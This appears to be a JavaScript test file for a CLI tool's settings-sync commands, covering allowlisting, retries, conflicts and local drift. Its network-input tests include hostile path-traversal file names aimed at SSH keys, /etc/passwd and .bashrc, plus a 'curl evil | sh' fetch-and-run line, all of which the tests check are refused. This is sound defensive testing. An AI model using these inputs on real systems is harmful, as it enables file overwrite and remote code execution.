// Settings sync — `/save` and `/load`.
//
// $HOME is a temp dir in every test: the module derives every path per call for
// exactly this reason, and a suite that read the aliases of whoever ran it would
// also be a suite that could overwrite them.
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";

import {
  MAX_FILE_BYTES,
  NEVER_SYNCED,
  SNAPSHOT_VERSION,
  SYNCED_FILES,
  applyFiles,
  collectSnapshot,
  digestFiles,
  isSyncable,
  loadCommand,
  loadMarker,
  localDrift,
  markerPath,
  planApply,
  saveCommand,
  validateSnapshot,
} from "../src/settings-sync.mjs";

const HOSTNAME = "testbox";
const INSTALLED = { engines: ["claude"], tools: ["gh"] };

/**
 * The files whose digest both sides pin. Kept identical to the fixture in
 * apps/pwa/test/settings-sync.test.mjs — that is the point of it.
 */
const DIGEST_FIXTURE = {
  "aliases.json": { content: '{"gs":"git status"}' },
  "herd/rules.json": { content: "{}" },
};

function home({ aliases = null, rules = null, credentials = true, marker = null, feeds = null } = {}) {
  const dir = mkdtempSync(path.join(tmpdir(), "moshcode-sync-"));
  const moshcode = path.join(dir, ".moshcode");
  fs.mkdirSync(moshcode, { recursive: true });
  if (credentials) {
    fs.writeFileSync(path.join(moshcode, "credentials.json"),
      JSON.stringify({ token: "mck_super_secret", email: "a@b.c" }));
  }
  if (aliases) fs.writeFileSync(path.join(moshcode, "aliases.json"), aliases);
  if (feeds) fs.writeFileSync(path.join(moshcode, "feeds.opml"), feeds);
  if (rules) {
    fs.mkdirSync(path.join(moshcode, "herd"), { recursive: true });
    fs.writeFileSync(path.join(moshcode, "herd", "rules.json"), rules);
  }
  if (marker) fs.writeFileSync(path.join(moshcode, "sync.json"), JSON.stringify(marker));
  return dir;
}

const read = (dir, rel) => fs.readFileSync(path.join(dir, ".moshcode", rel), "utf8");
const exists = (dir, rel) => fs.existsSync(path.join(dir, ".moshcode", rel));

/** A fetch stub: records calls, answers from a queue of [status, body]. */
function stubFetch(replies) {
  const calls = [];
  const queue = [...replies];
  const impl = async (url, init = {}) => {
    calls.push({ url: String(url), method: init.method || "GET", body: init.body ? JSON.parse(init.body) : null });
    const [status, body] = queue.shift() || [500, { error: "no reply queued" }];
    return {
      ok: status >= 200 && status < 300,
      status,
      text: async () => JSON.stringify(body),
    };
  };
  impl.calls = calls;
  return impl;
}

/** The per-file digest the marker stores — tests build markers that look real. */
const hash = (content) => crypto.createHash("sha256").update(content).digest("hex");

const CREDS = { api: "https://app.test", token: "mck_test", email: "a@b.c" };
const lines = () => {
  const out = [];
  const write = (line) => out.push(String(line));
  write.text = () => out.join("\n");
  write.out = out;
  return write;
};

/* ------------------------------------------------------------ the allowlist */

test("the credential file is never syncable, whatever the allowlist says", () => {
  // The token this feature authenticates with lives beside the files it syncs.
  // Syncing it would hand every machine that ran /load a credential it was never
  // issued, so it is refused by name as well as by omission.
  assert.equal(isSyncable("credentials.json"), false);
  for (const never of NEVER_SYNCED) {
    assert.equal(isSyncable(never), false, `${never} must never sync`);
    assert.ok(!SYNCED_FILES.some((f) => f.path === never), `${never} is in both lists`);
  }
  assert.equal(isSyncable("pkg/moshcode/bin/moshcode"), false);
  assert.equal(isSyncable("aliases.json"), true);
});

test("a snapshot carries the settings and nothing else from ~/.moshcode", () => {
  const dir = home({ aliases: '{"gs":"git status"}', rules: '{"blocked":["\\\\?"]}' });
  fs.writeFileSync(path.join(dir, ".moshcode", "herd", "sessions.json"), '{"live":1}');

  const { snapshot, included, skipped } = collectSnapshot({
    home: dir, hostname: HOSTNAME, version: "9.9.9", installed: INSTALLED,
  });

  assert.deepEqual(Object.keys(snapshot.files).sort(), ["aliases.json", "herd/rules.json"]);
  assert.equal(snapshot.version, SNAPSHOT_VERSION);
  assert.equal(snapshot.host, HOSTNAME);
  assert.equal(snapshot.moshcode, "9.9.9");
  assert.deepEqual(snapshot.installed, INSTALLED);
  assert.equal(included.length, 2);
  assert.deepEqual(skipped, []);

  const serialized = JSON.stringify(snapshot);
  assert.ok(!serialized.includes("mck_super_secret"), "the API token reached the snapshot");
  assert.ok(!serialized.includes("sessions.json"), "live herd state reached the snapshot");
});

test("a file that is present but unusable is reported, not silently dropped", () => {
  const dir = home({ aliases: "{not json" });
  const { included, skipped } = collectSnapshot({ home: dir, installed: INSTALLED });
  assert.deepEqual(included, []);
  assert.equal(skipped.length, 1);
  assert.match(skipped[0].reason, /valid JSON/);

  const big = home({ aliases: JSON.stringify({ a: "x".repeat(MAX_FILE_BYTES) }) });
  const oversize = collectSnapshot({ home: big, installed: INSTALLED });
  assert.equal(oversize.included.length, 0);
  assert.match(oversize.skipped[0].reason, /cap/);
});

test("the digest is over names and contents, and is order-independent", () => {
  const a = digestFiles({ "aliases.json": { content: "1" }, "herd/rules.json": { content: "2" } });
  const b = digestFiles({ "herd/rules.json": { content: "2" }, "aliases.json": { content: "1" } });
  assert.equal(a, b);
  // Framed lengths, so content cannot be arranged to look like a different file list.
  assert.notEqual(a, digestFiles({ "aliases.json": { content: "12" } }));
});

test("the digest of a fixed input is pinned, because the app computes it too", () => {
  // The app recomputes this over the same bytes (apps/pwa/src/routes/settings-sync.mjs,
  // digestSnapshot) and pins the same hex in its own suite. They diverged once —
  // one framed its fields with a NUL and the other with a space — and nothing
  // caught it, because no code path compared the two. This is that catch.
  assert.equal(
    digestFiles(DIGEST_FIXTURE),
    "659fc77cca201fa9499620fc6bf34535d30313c4748658c84e5887ba0aa2761b",
  );
});

/* ------------------------------------------------- what arrives off the wire */

test("a snapshot from the network cannot write outside the settings dir", () => {
  const { ok, files, rejected } = validateSnapshot({
    version: 1,
    files: {
      "aliases.json": { content: "{}" },
      "../../.ssh/authorized_keys": { content: "ssh-rsa AAAA" },
      "/etc/passwd": { content: "root:x:0:0" },
      "herd/../../.bashrc": { content: "curl evil | sh" },
      "unknown-file.json": { content: "{}" },
    },
  });
  assert.equal(ok, true);
  assert.deepEqual(Object.keys(files), ["aliases.json"]);
  assert.equal(rejected.length, 4, "every hostile or unknown name must be refused by name");
});

test("a snapshot from a newer moshcode is refused with the upgrade to run", () => {
  const { ok, error } = validateSnapshot({ version: SNAPSHOT_VERSION + 1, files: { "aliases.json": { content: "{}" } } });
  assert.equal(ok, false);
  assert.match(error, /newer moshcode/);
  assert.match(error, /upgrade/);
});

test("a settings file that is not the JSON it claims to be is not written", () => {
  const { files, rejected } = validateSnapshot({ version: 1, files: { "aliases.json": { content: "{oops" } } });
  assert.deepEqual(files, {});
  assert.match(rejected[0].reason, /valid JSON/);
});

test("applying writes owner-only, and leaves identical files alone", () => {
  const dir = home({ aliases: '{"gs":"git status"}' });
  const files = { "aliases.json": { content: '{"gs":"git status"}' }, "herd/rules.json": { content: "{}" } };

  const plan = planApply(files, { home: dir });
  assert.deepEqual(plan.map((p) => [p.path, p.action]), [["aliases.json", "same"], ["herd/rules.json", "new"]]);

  const applied = applyFiles(files, { home: dir });
  assert.equal(applied.find((p) => p.path === "aliases.json").written, undefined);
  assert.equal(applied.find((p) => p.path === "herd/rules.json").written, true);
  assert.equal(read(dir, "herd/rules.json"), "{}");
  assert.equal(fs.statSync(path.join(dir, ".moshcode", "herd", "rules.json")).mode & 0o777, 0o600);
  // No temp file left behind by the atomic write.
  assert.deepEqual(fs.readdirSync(path.join(dir, ".moshcode", "herd")), ["rules.json"]);
});

/* ------------------------------------------------------------------- /save */

test("/save without a login says which command to run", async () => {
  const write = lines();
  const code = await saveCommand([], {
    home: home({ aliases: "{}" }), creds: null, write, installed: INSTALLED,
    fetchImpl: stubFetch([]),
  });
  assert.equal(code, 1);
  assert.match(write.text(), /\/login/);
});

test("/save with nothing to save is not an error", async () => {
  const write = lines();
  const code = await saveCommand([], {
    home: home({}), creds: CREDS, write, installed: INSTALLED, fetchImpl: stubFetch([]),
  });
  assert.equal(code, 0);
  assert.match(write.text(), /nothing to save/);
});

test("/save uploads, then records the revision it agreed on", async () => {
  const dir = home({ aliases: '{"gs":"git status"}' });
  const fetchImpl = stubFetch([[200, { revision: 4, digest: "d", savedAt: 1 }]]);
  const write = lines();

  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write, hostname: HOSTNAME, version: "1.2.3", installed: INSTALLED });
  assert.equal(code, 0);
  assert.equal(fetchImpl.calls.length, 1);
  assert.equal(fetchImpl.calls[0].method, "PUT");
  assert.equal(fetchImpl.calls[0].url, "https://app.test/api/settings");
  assert.equal(fetchImpl.calls[0].body.ifRevision, null, "a machine that never synced sends no precondition");

  const marker = loadMarker(dir);
  assert.equal(marker.revision, 4);
  assert.equal(marker.api, "https://app.test");
  assert.ok(marker.files["aliases.json"], "the marker records a digest per file");
  assert.equal(fs.statSync(markerPath(dir)).mode & 0o777, 0o600);
  assert.match(write.text(), /revision 4/);
});

test("/save sends the revision it last saw, and reports a conflict rather than winning it", async () => {
  const dir = home({ aliases: '{"gs":"git status --short"}', marker: { revision: 7, digest: "stale", at: 1, files: {} } });
  const fetchImpl = stubFetch([[409, { error: "moved on", revision: 9 }]]);
  const write = lines();

  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write, installed: INSTALLED });
  assert.equal(code, 1);
  assert.equal(fetchImpl.calls[0].body.ifRevision, 7);
  assert.match(write.text(), /revision 9/);
  assert.match(write.text(), /\/load/);
  assert.match(write.text(), /--force/);
  assert.equal(loadMarker(dir).revision, 7, "a refused save must not move the marker");
});

const OPML = '<?xml version="1.0"?>\n<opml version="2.0"><body>' +
  '<outline type="rss" text="leaddev.com" xmlUrl="https://leaddev.com/feed"/>' +
  "</body></opml>\n";

test("/save carries the feed list, and does not try to parse it", async () => {
  const dir = home({ aliases: "{}", feeds: OPML });
  const fetchImpl = stubFetch([[200, { revision: 1 }]]);

  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write: lines(), installed: INSTALLED });
  assert.equal(code, 0);
  const sent = fetchImpl.calls[0].body.snapshot.files;
  assert.equal(sent["feeds.opml"].content, OPML, "OPML travels byte for byte");
});

test("a feed list that is not XML still syncs — nothing here reads it", async () => {
  // The contrast with aliases.json is the point: that one is `json: true` and
  // a broken one is held back rather than copied to every machine. OPML is
  // moved, never parsed, so there is no such thing as a broken one here.
  const dir = home({ aliases: "{}", feeds: "this is not xml at all" });
  const fetchImpl = stubFetch([[200, { revision: 1 }]]);

  await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write: lines(), installed: INSTALLED });
  assert.ok(fetchImpl.calls[0].body.snapshot.files["feeds.opml"], "it went anyway");
});

test("a 502 is the app not answering, so it is retried rather than reported", async () => {
  const dir = home({ aliases: "{}" });
  const fetchImpl = stubFetch([[502, { message: "Application failed to respond" }], [200, { revision: 3 }]]);
  const write = lines();

  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write, installed: INSTALLED });
  assert.equal(code, 0, "the second attempt is the answer");
  assert.equal(fetchImpl.calls.length, 2);
  assert.equal(loadMarker(dir).revision, 3);
  assert.doesNotMatch(write.text(), /502/, "a blip that was ridden out is not worth a line");
});

test("a 409 is an answer and is never retried", async () => {
  // The distinction the retry turns on: 5xx means the app did not see the
  // request, everything else means it did. Retrying a conflict would only
  // ask the same question again and lose the same race.
  const dir = home({ aliases: "{}", marker: { revision: 2, digest: "d", at: 1, files: {} } });
  const fetchImpl = stubFetch([[409, { error: "moved on", revision: 5 }]]);

  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write: lines(), installed: INSTALLED });
  assert.equal(code, 1);
  assert.equal(fetchImpl.calls.length, 1, "asked once");
});

test("a 502 that never clears is still reported rather than retried forever", async () => {
  const dir = home({ aliases: "{}" });
  const fetchImpl = stubFetch([[502, {}], [502, {}], [502, {}], [502, {}]]);
  const write = lines();

  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write, installed: INSTALLED });
  assert.equal(code, 1);
  assert.equal(fetchImpl.calls.length, 3, "the first try and two retries, then it is news");
  assert.match(write.text(), /could not save/);
});

test("/save --force drops the precondition", async () => {
  const dir = home({ aliases: "{}", marker: { revision: 7, digest: "stale", at: 1, files: {} } });
  const fetchImpl = stubFetch([[200, { revision: 10 }]]);
  await saveCommand(["--force"], { home: dir, creds: CREDS, fetchImpl, write: lines(), installed: INSTALLED });
  assert.equal(fetchImpl.calls[0].body.ifRevision, null);
  assert.equal(loadMarker(dir).revision, 10);
});

test("'nothing changed' is the account's answer, not a local guess", async () => {
  // The app recognises a byte-identical snapshot and returns the revision it
  // already holds. Deciding this locally from the marker was wrong in the one
  // case that matters: after the saved settings are deleted from the web, every
  // machine confidently reported "already saved" and refused to re-upload.
  const dir = home({ aliases: '{"gs":"git status"}' });
  const { snapshot } = collectSnapshot({ home: dir, installed: INSTALLED });
  fs.writeFileSync(markerPath(dir), JSON.stringify({ revision: 3, digest: digestFiles(snapshot.files), at: Date.now(), files: {} }));

  const fetchImpl = stubFetch([[200, { revision: 3, digest: "d", savedAt: Date.now(), unchanged: true }]]);
  const write = lines();
  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write, installed: INSTALLED });
  assert.equal(code, 0);
  assert.equal(fetchImpl.calls.length, 1, "the account is asked");
  assert.match(write.text(), /already saved/);
});

test("a stale marker cannot stop a save the account needs", async () => {
  // The marker says revision 3 with these exact files; the account has since
  // been emptied and answers with a fresh revision 1. The machine must accept
  // that answer rather than insisting it is already saved.
  const dir = home({ aliases: '{"gs":"git status"}' });
  const { snapshot } = collectSnapshot({ home: dir, installed: INSTALLED });
  fs.writeFileSync(markerPath(dir), JSON.stringify({ revision: 3, digest: digestFiles(snapshot.files), at: Date.now(), files: {} }));

  const fetchImpl = stubFetch([[200, { revision: 1, digest: "d", savedAt: Date.now() }]]);
  const write = lines();
  const code = await saveCommand([], { home: dir, creds: CREDS, fetchImpl, write, installed: INSTALLED });
  assert.equal(code, 0);
  assert.match(write.text(), /revision 1/);
  assert.equal(loadMarker(dir).revision, 1, "the marker follows the account, not the other way round");
});

test("/save --dry-run lists the files and touches nothing", async () => {
  const dir = home({ aliases: "{}" });
  const fetchImpl = stubFetch([]);
  const write = lines();
  const code = await saveCommand(["--dry-run"], { home: dir, creds: CREDS, fetchImpl, write, installed: INSTALLED });
  assert.equal(code, 0);
  assert.equal(fetchImpl.calls.length, 0);
  assert.match(write.text(), /would save/);
  assert.equal(exists(dir, "sync.json"), false);
});

test("/save --json is parseable, including its failures", async () => {
  const write = lines();
  await saveCommand(["--json"], { home: home({ aliases: "{}" }), creds: null, write, fetchImpl: stubFetch([]), installed: INSTALLED });
  assert.equal(JSON.parse(write.text()).status, "not_logged_in");
});

test("an unknown option is refused rather than ignored", async () => {
  const write = lines();
  assert.equal(await saveCommand(["--yolo"], { home: home({}), creds: CREDS, write, fetchImpl: stubFetch([]), installed: INSTALLED }), 1);
  assert.match(write.text(), /--yolo/);
});

/* ------------------------------------------------------------------- /load */

const snapshotFor = (files, extra = {}) => ({
  version: 1, host: "laptop", moshcode: "1.0.0", installed: { engines: ["codex"], tools: [] }, files, ...extra,
});

test("/load writes the account's settings onto a fresh machine", async () => {
  const dir = home({});
  const fetchImpl = stubFetch([[200, {
    revision: 5,
    snapshot: snapshotFor({ "aliases.json": { content: '{"gs":"git status"}' } }),
  }]]);
  const write = lines();

  const code = await loadCommand([], { home: dir, creds: CREDS, fetchImpl, write, installed: { engines: [], tools: [] } });
  assert.equal(code, 0);
  assert.equal(read(dir, "aliases.json"), '{"gs":"git status"}');
  assert.equal(loadMarker(dir).revision, 5);
  assert.match(write.text(), /revision 5/);
  // The engines the source machine had are named, never installed.
  assert.match(write.text(), /codex/);
});

test("/load refuses to overwrite a file edited since the last sync", async () => {
  const dir = home({ aliases: '{"gs":"git status"}' });
  // Synced once, then edited locally: the marker still holds the old digest.
  const { snapshot } = collectSnapshot({ home: dir, installed: INSTALLED });
  const before = digestFiles(snapshot.files);
  fs.writeFileSync(markerPath(dir), JSON.stringify({
    revision: 2, digest: before, at: Date.now(),
    files: { "aliases.json": hash('{"gs":"git status"}') },
  }));
  fs.writeFileSync(path.join(dir, ".moshcode", "aliases.json"), '{"gs":"git status --short"}');

  const remote = snapshotFor({ "aliases.json": { content: '{"gs":"git log"}' } });
  const write = lines();
  const code = await loadCommand([], {
    home: dir, creds: CREDS, write,
    fetchImpl: stubFetch([[200, { revision: 6, snapshot: remote }]]),
    installed: { engines: [], tools: [] },
  });

  assert.equal(code, 1);
  assert.equal(read(dir, "aliases.json"), '{"gs":"git status --short"}', "local work must survive a refusal");
  assert.match(write.text(), /aliases\.json/);
  assert.match(write.text(), /--force/);
  assert.equal(loadMarker(dir).revision, 2);

  // --force is the escape hatch, and it says what it did.
  const forced = lines();
  const code2 = await loadCommand(["--force"], {
    home: dir, creds: CREDS, write: forced,
    fetchImpl: stubFetch([[200, { revision: 6, snapshot: remote }]]),
    installed: { engines: [], tools: [] },
  });
  assert.equal(code2, 0);
  assert.equal(read(dir, "aliases.json"), '{"gs":"git log"}');
  assert.equal(loadMarker(dir).revision, 6);
});

test("/load --dry-run reports the plan and writes nothing", async () => {
  const dir = home({ aliases: '{"gs":"git status"}' });
  const write = lines();
  const code = await loadCommand(["--dry-run"], {
    home: dir, creds: CREDS, write,
    fetchImpl: stubFetch([[200, { revision: 8, snapshot: snapshotFor({ "aliases.json": { content: '{"gs":"git log"}' } }) }]]),
    installed: { engines: [], tools: [] },
  });
  assert.equal(code, 0);
  assert.equal(read(dir, "aliases.json"), '{"gs":"git status"}');
  assert.equal(exists(dir, "sync.json"), false);
  assert.match(write.text(), /changed\s+aliases\.json/);
});

test("/load will not be talked into writing outside the settings dir", async () => {
  const dir = home({});
  const escape = path.join(dir, "pwned");
  const write = lines();
  const code = await loadCommand([], {
    home: dir, creds: CREDS, write,
    fetchImpl: stubFetch([[200, {
      revision: 1,
      snapshot: snapshotFor({
        "../pwned": { content: "owned" },
        "aliases.json": { content: "{}" },
      }),
    }]]),
    installed: { engines: [], tools: [] },
  });
  assert.equal(code, 0);
  assert.equal(fs.existsSync(escape), false, "a path outside ~/.moshcode was written");
  assert.equal(read(dir, "aliases.json"), "{}");
  assert.match(write.text(), /ignored/);
});

test("/load with an empty account explains how to fill it", async () => {
  const write = lines();
  const code = await loadCommand([], {
    home: home({}), creds: CREDS, write, fetchImpl: stubFetch([[404, { error: "nothing saved yet" }]]),
    installed: { engines: [], tools: [] },
  });
  assert.equal(code, 1);
  assert.match(write.text(), /\/save/);
});

test("a network failure is a line and an exit code, never a throw", async () => {
  const dead = async () => { throw new Error("ECONNREFUSED"); };
  const write = lines();
  const code = await loadCommand([], { home: home({}), creds: CREDS, write, fetchImpl: dead, installed: { engines: [], tools: [] } });
  assert.equal(code, 1);
  assert.match(write.text(), /could not (load|reach)/);
});

test("an expired session points at /login rather than at the status code", async () => {
  const write = lines();
  await loadCommand([], { home: home({}), creds: CREDS, write, fetchImpl: stubFetch([[401, { error: "invalid" }]]), installed: { engines: [], tools: [] } });
  assert.match(write.text(), /\/login/);
});

test("drift is named per file so the message can be acted on", () => {
  const dir = home({ aliases: '{"a":"1"}', rules: "{}" });
  const { snapshot } = collectSnapshot({ home: dir, installed: INSTALLED });
  fs.writeFileSync(markerPath(dir), JSON.stringify({
    revision: 1, digest: digestFiles(snapshot.files), at: Date.now(),
    files: { "aliases.json": hash('{"a":"1"}'), "herd/rules.json": hash("{}") },
  }));
  assert.deepEqual(localDrift({ home: dir }), { known: true, drifted: false, digest: digestFiles(snapshot.files), files: [] });

  fs.writeFileSync(path.join(dir, ".moshcode", "aliases.json"), '{"a":"2"}');
  const drift = localDrift({ home: dir });
  assert.equal(drift.drifted, true);
  assert.deepEqual(drift.files, ["aliases.json"], "only the file that moved is named");
});

